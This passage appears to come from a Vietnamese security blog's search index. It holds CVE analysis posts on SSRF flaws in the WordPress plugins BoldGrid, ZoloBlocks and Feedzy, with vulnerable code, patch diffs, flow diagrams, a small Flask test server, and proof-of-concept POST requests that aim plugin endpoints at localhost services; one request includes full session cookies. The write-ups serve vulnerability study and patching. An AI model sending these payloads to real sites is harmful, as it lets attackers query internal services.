--\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ‚Üê SSRF sink\"]\rF --\u003e G[\"extract headers['location'] ‚Üí $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url ‚Üí get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ‚Üê SSRF sink\"]\rF --\u003e G[\"extract headers['location'] ‚Üí $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\rgraph TD\rA[\"Client POST /wp-admin/admin-ajax.php?action=boldgrid_redirect_url + $_POST['urls']\"] --\u003e B[\"wp_ajax_boldgrid_redirect_url ‚Üí get_redirect_url()\"]\rB --\u003e C[\"self::validate_nonce('image')\"]\rC --\u003e D[\"read $_POST['urls']\"]\rD --\u003e E[\"foreach $url\"]\rE --\u003e F[\"wp_remote_head($url) ‚Üê SSRF sink\"]\rF --\u003e G[\"extract headers['location'] ‚Üí $redirectUrls\"]\rG --\u003e H{\"$redirectUrls not empty?\"}\rH -- Yes --\u003e I[\"wp_send_json_success($redirectUrls)\"]\rH -- No --\u003e J[\"wp_send_json_error()\"]\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C07a62e731a6142aa7b15555fdd5e1cbdd114cffb4a041ba0ecd9394c8319bb3f; wp-settings-time-2=1761643645; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1761816248%7CDDS70mMGANEkpR68MrIikvC8WRqNkBMl8KlbXrbSh8Q%7C450b8e4bb8ebb335d435b94645ae098cee383a09a6e129efbdec8a2348deeda0 ... action=boldgrid_redirect_url\u0026urls[0]=http://localhost:8001/metadata\u0026boldgrid_gridblock_image_ajax_nonce=482dbb1ed2 Result: N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service\r","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-52713 xu·∫•t ph√°t t·ª´ vi·ªác h√†m get_redirect_url() trong plugin BoldGrid Post and Page Builder (‚â§ 1.27.8) g·ª≠i y√™u c·∫ßu HTTP ƒë·∫øn URL do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng ki·ªÉm tra ho·∫∑c gi·ªõi h·∫°n, d·∫´n ƒë·∫øn SSRF. K·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn Contributor c√πng nonce h·ª£p l·ªá c√≥ th·ªÉ bu·ªôc m√°y ch·ªß g·ª≠i request ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô. B·∫£n v√° (1.27.9) kh·∫Øc ph·ª•c b·∫±ng c√°ch d√πng esc_url_raw() v√† wp_safe_remote_head() v·ªõi gi·ªõi h·∫°n timeout v√† redirection, ngƒÉn ch·∫∑n y√™u c·∫ßu nguy hi·ªÉm. ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rNguy√™n nh√¢n: thi·∫øu x√°c th·ª±c v√† l·ªçc ƒë·∫ßu v√†o URL. Nonce ch·ªâ ch·ªëng CSRF, kh√¥ng ngƒÉn SSRF. M·ª©c ƒë·ªô ·∫£nh h∆∞·ªüng: Low (6.4) nh∆∞ng c√≥ th·ªÉ d·∫´n ƒë·∫øn r√≤ r·ªâ d·ªØ li·ªáu n·ªôi b·ªô. C·∫≠p nh·∫≠t l√™n v1.27.9 ƒë·ªÉ v√° l·ªói. Khi ph√°t tri·ªÉn, n√™n lu√¥n d√πng API an to√†n (wp_safe_remote_*) v√† l·ªçc URL b·∫±ng esc_url_raw(). ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress Post and Page Builder by BoldGrid ‚Äì Visual Drag and Drop Editor Plugin \u003c= 1.27.8 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-01","objectID":"/vi/posts/2025-11-01-cve-2025-52713/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/vi/posts/2025-11-01-cve-2025-52713/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ZoloBlocks Plugin.","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Server-Side Request Forgery (SSRF) trong BdThemes ZoloBlocks cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán y√™u c·∫ßu gi·∫£ m·∫°o t·ª´ ph√≠a m√°y ch·ªß. S·ª± c·ªë n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n ZoloBlocks t·ª´ kh√¥ng x√°c ƒë·ªãnh cho ƒë·∫øn 2.3.11. CVE ID: CVE-2025-60161 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.3.11 Patched Versions: 2.3.12 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress ZoloBlocks Plugin ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - ZoloBlocks: 2.3.11 (vulnerable) v√† 2.3.12 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rL·ªó h·ªïng n√†y xu·∫•t hi·ªán trong t·ªáp TemplatesV1.php, tuy nhi√™n t·ªáp n√†y ƒë√£ b·ªã lo·∫°i b·ªè trong phi√™n b·∫£n v√° l·ªói. TemplatesV1.php ƒë√£ b·ªã lo·∫°i b·ªè trong b·∫£n v√°\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic function demo_import() { // Ki·ªÉm tra tham s·ªë ƒë·∫ßu v√†o t·ª´ POST if (!isset($_POST['json_file_url'])) { wp_send_json_error('No JSON file URL provided'); return; } // L·∫•y v√† l√†m s·∫°ch URL ng∆∞·ªùi d√πng cung c·∫•p $json_file_url = sanitize_text_field(wp_unslash($_POST['json_file_url'])); // G·ª≠i y√™u c·∫ßu HTTP ƒë·∫øn URL ƒë√≥ $response = wp_remote_get($json_file_url, ['timeout' =\u003e 30]); // N·∫øu l·ªói khi fetch d·ªØ li·ªáu, tr·∫£ JSON l·ªói if (is_wp_error($response)) { wp_send_json_error('Failed to fetch JSON data'); return; } // L·∫•y n·ªôi dung ph·∫£n h·ªìi v√† gi·∫£i m√£ JSON $body = wp_remote_retrieve_body($response); $data = json_decode($body, true); $content = $data['content'] ?? ''; // Tr·∫£ k·∫øt qu·∫£ JSON th√†nh c√¥ng c√πng n·ªôi dung import wp_send_json_success([ 'status' =\u003e 'success', 'message' =\u003e __('Pattern imported successfully!', 'zoloblocks'), 'content' =\u003e $content, ]); } L·ªói\rH√†m demo_import() nh·∫≠n URL t·ª´ ng∆∞·ªùi d√πng =\u003e g·ª≠i y√™u c·∫ßu HTTP (wp_remote_get) ƒë·ªÉ t·∫£i d·ªØ li·ªáu JSON ‚Üí gi·∫£i m√£ v√† tr·∫£ v·ªÅ k·∫øt qu·∫£ qua wp_send_json_success(). V√¨ kh√¥ng ki·ªÉm tra ho·∫∑c gi·ªõi h·∫°n URL, n√™n c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng g√¢y SSRF.\rH√†m demo_import() ƒë∆∞·ª£c ƒëƒÉng k√≠ l√†m callback cho action hook: add_action('wp_ajax_nopriv_zolo_demo_import', [$this, 'demo_import']); ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: Hook wp_ajax_nopriv_ ƒë∆∞·ª£c s·ª≠ d·ª•ng cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (anonymous users). Khi client g·ª≠i request AJAX ƒë·∫øn endpoint /wp-admin/admin-ajax.php?action=zolo_demo_import, WordPress s·∫Ω g·ªçi h√†m demo_import(). ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\rgraph TD\rA[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"]\rB --\u003e C[\"demo_import()\"]\rC --\u003e D[\"sanitize_text_field()\"]\rD --\u003e E[\"wp_remote_get(json_file_url)\"]\rE --\u003e F{\"is_wp_error(response)?\"}\rF -- Yes --\u003e G[\"wp_send_json_error()\"]\rF -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"]\rH --\u003e I[\"wp_send_json_success()\"]\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Local Server\rT·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#local-server"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rG·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=zolo_demo_import\u0026json_file_url=http://127.0.0.1:8001/metadata Result: N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service\r","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-60161 l√† m·ªôt SSRF trong demo_import() c·ªßa ZoloBlocks (‚â§ 2.3.11) do nh·∫≠n URL t·ª´ ng∆∞·ªùi d√πng v√† g·ªçi wp_remote_get() m√† kh√¥ng ki·ªÉm tra. Endpoint cho ph√©p truy c·∫≠p kh√¥ng x√°c th·ª±c (wp_ajax_nopriv_...). V·∫•n ƒë·ªÅ ƒë√£ ƒë∆∞·ª£c v√° trong 2.3.12. ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rNguy√™n nh√¢n: kh√¥ng validate/whitelist URL tr∆∞·ªõc khi wp_remote_get(). ·∫¢nh h∆∞·ªüng: site ch·∫°y ZoloBlocks ‚â§ 2.3.11; attacker c√≥ th·ªÉ truy v·∫•n d·ªãch v·ª• n·ªôi b·ªô (SSRF). Kh·∫Øc ph·ª•c nhanh: c·∫≠p nh·∫≠t l√™n 2.3.12 ho·∫∑c ch·∫∑n endpoint zolo_demo_import. Ph√≤ng ng·ª´a: whitelist/validate URL, gi·ªõi h·∫°n egress, b·∫£o v·ªá AJAX b·∫±ng nonce/quy·ªÅn. ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) ‚Äî Hacktrick WordPress ZoloBlocks Plugin \u003c= 2.3.11 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-31","objectID":"/vi/posts/2025-10-31-cve-2025-60161/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/vi/posts/2025-10-31-cve-2025-60161/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Feedzy Plugin.","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin RSS Aggregator c·ªßa Feedzy ‚Äì Feed to Post, Autoblogging, News \u0026 YouTube Video Feeds Aggregator cho WordPress b·ªã l·ªó h·ªïng Server-Side Request Forgery trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 5.1.0 th√¥ng qua h√†m 'feedzy_sanitize_feeds'. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn truy c·∫≠p ·ªü m·ª©c Subscriber tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi c√°c ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ truy v·∫•n th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô. CVE ID: CVE-2025-11128 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.1.0 Patched Versions: 5.1.1 CVSS severity: Low (5) Required Privilege: Subscriber Product: WordPress Feedzy Plugin ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Feedzy: 5.1.0 (vulnerable) v√† 5.1.1 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin Feedzy RSS Aggregator ƒë√£ ƒëƒÉng k√Ω m·ªôt REST API endpoint t·∫°i /feedzy/v1/feed/, cho ph√©p ng∆∞·ªùi d√πng g·ª≠i URL ƒë·ªÉ l·∫•y d·ªØ li·ªáu feed. Tuy nhi√™n, trong phi√™n b·∫£n 5.1.0, endpoint n√†y ƒë∆∞·ª£c b·∫£o v·ªá l·ªèng l·∫ªo v√† c∆° ch·∫ø l·ªçc URL kh√¥ng an to√†n, d·∫´n ƒë·∫øn l·ªó h·ªïng SSRF (Server-Side Request Forgery). ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rpublic function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function () { return is_user_logged_in(); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = esc_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { $feeds[] = esc_url( $item ); } return $feeds; } } Trong phi√™n b·∫£n l·ªói: Endpoint ch·ªâ ki·ªÉm tra is_user_logged_in(), t·ª©c l√† b·∫•t k·ª≥ t√†i kho·∫£n ƒë√£ ƒëƒÉng nh·∫≠p n√†o (k·ªÉ c·∫£ Subscriber) ƒë·ªÅu c√≥ th·ªÉ g·ª≠i request. H√†m feedzy_sanitize_feeds() ch·ªâ s·ª≠ d·ª•ng esc_url() - h√†m n√†y ch·ªâ l√†m s·∫°ch chu·ªói URL ƒë·ªÉ hi·ªÉn th·ªã, kh√¥ng x√°c th·ª±c t√≠nh h·ª£p l·ªá hay gi·ªõi h·∫°n truy c·∫≠p n·ªôi b·ªô. L·ªói\rDo ƒë√≥, attacker c√≥ th·ªÉ g·ª≠i payload url=http://localhost:8001/admin ƒë·ªÉ √©p server g·ª≠i request ƒë·∫øn d·ªãch v·ª• n·ªôi b·ªô ‚Üí SSRF.\rpublic function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function ( WP_REST_Request $request ) { $post_id = absint( $request-\u003eget_param( 'postId' ) ); return current_user_can( 'edit_post', $post_id ); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = wp_http_validate_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { if ( wp_http_validate_url( $item ) ) { $feeds[] = esc_url_raw( $item ); } } return $feeds; } } B·∫£n v√° ƒë√£: Gi·ªõi h·∫°n quy·ªÅn truy c·∫≠p REST API b·∫±ng current_user_can( 'edit_post', $post_id ), ch·ªâ cho ph√©p Editor ho·∫∑c Admin c√≥ quy·ªÅn g·ªçi endpoint. Thay th·∫ø esc_url() b·∫±ng wp_http_validate_url(), ƒë·∫£m b·∫£o URL h·ª£p l·ªá, ch·ªâ ch·∫•p nh·∫≠n giao th·ª©c http/https, v√† lo·∫°i b·ªè ƒë·ªãa ch·ªâ n·ªôi b·ªô (loopback, localhost, 127.0.0.1...). S·ª≠ d·ª•ng esc_url_raw() ƒë·ªÉ l∆∞u URL an to√†n m√† kh√¥ng t·ª± ƒë·ªông m√£ h√≥a l·∫°i. Th√¥ng tin\rH√†m count() trong feedzy_sanitize_feeds() y√™u c·∫ßu tham s·ªë ƒë·∫ßu v√†o ph·∫£i thu·ªôc ki·ªÉu Countable ho·∫∑c array. N·∫øu truy·ªÅn v√†o m·ªôt string, PHP s·∫Ω n√©m l·ªói: L·ªói\rException has occurred. TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given\rV√¨ v·∫≠y, khi g·ª≠i request ƒë·∫øn endpoint, c·∫ßn truy·ªÅn tham s·ªë url d∆∞·ªõi d·∫°ng m·∫£ng, v√≠ d·ª•: url[0]=\"http://example.com\" ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rfeedzy_rest_route() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho API tr√™n: public function feedzy_rest_route( $data ) { $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } $meta_args = array( 'date_format' =\u003e get_option( 'date_format' ), 'time_format' =\u003e get_option( 'time_format' ), ); $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_feed( $url, '12_hours', array( '' ) ); $feedy = array(); if ( ! $feed-\u003einit() ) { $feedy['error'] = __( 'Invalid Feed URL', 'feedzy-rss-feeds' ); header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); return $feedy; } if ( ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) ) { $feedy['channel'] = null; } else { $feedy['channel'] = array( 'title' =\u003e ( ( $feed-\u003eget_title() ) ? $feed-\u003eget_title() : null ), 'description' =\u003e ( ( $feed-\u003eget_description() ) ? $feed-\u003eget_description() : null ), 'permalink' =\u003e ( ( $feed-\u003eget_permalink() ) ? $feed-\u003eget_permalink() : null ), ); } $feedy['items'] = array(); $items = $feed-\u003eget_items(); $is_multiple = ! empty( $feed-\u003emultifeed_url ) \u0026\u0026 is_array( $feed-\u003emultifeed_url ); foreach ( $items as $item ) { $item_attrs = apply_filters( 'feedzy_item_filter', array(), $item ); array_push( $feedy['items'], array( 'title' =\u003e ( ( $item-\u003eget_title() ) ? $item-\u003eget_title() : null ), 'link' =\u003e ( ( $item-\u003eget_permalink() ) ? $item-\u003eget_permalink() : null ), 'creator' =\u003e ( ( $item-\u003eget_author() ) ? $item-\u003eget_author()-\u003eget_name() : null ), 'source' =\u003e $is_multiple \u0026\u0026 $item-\u003eget_feed()-\u003eget_title() ? $item-\u003eget_feed()-\u003eget_title() : '', 'pubDate' =\u003e ( ( $item-\u003eget_date() ) ? $item-\u003eget_date( 'U' ) : null ), 'date' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['date_format'], $item-\u003eget_date( 'U' ) ) : null ), 'time' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['time_format'], $item-\u003eget_date( 'U' ) ) : null ), 'description' =\u003e isset( $item_attrs['item_description'] ) ? $item_attrs['item_description'] : ( $item-\u003eget_description() ? $item-\u003eget_description() : null ), 'thumbnail' =\u003e $admin-\u003efeedzy_retrieve_image( $item ), 'default_img' =\u003e apply_filters( 'feedzy_default_image', '', $url ), 'price' =\u003e isset( $item_attrs['item_price'] ) ? $item_attrs['item_price'] : null, 'media' =\u003e isset( $item_attrs['item_media'] ) ? $item_attrs['item_media'] : null, 'categories' =\u003e isset( $item_attrs['item_categories'] ) ? $item_attrs['item_categories'] : null, ) ); } header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); $output = $feedy; return $output; } Logic c·ªßa h√†m: Nh·∫≠n v√† x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } H√†m ki·ªÉm tra n·∫øu request c√≥ ch·ª©a tham s·ªë feeds, n√≥ s·∫Ω ƒë∆∞·ª£c l√†m s·∫°ch (sanitize) qua 